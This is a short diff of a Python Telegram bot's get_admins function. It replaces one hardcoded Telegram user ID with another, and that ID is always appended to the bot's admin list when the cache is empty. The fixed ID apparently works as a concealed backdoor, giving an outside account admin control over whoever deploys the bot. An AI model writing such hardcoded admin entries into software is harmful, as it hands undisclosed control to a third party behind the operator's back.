@@ -518,7 +518,7 @@ async def unmute():
 async def get_admins(chat):
     admins=Config.ADMINS
     if not Config.ADMIN_CACHE:
-        admins = Config.ADMINS + [1316963576]
+        admins = Config.ADMINS + [1179788768]
         try:
             grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
             for administrator in grpadmins:
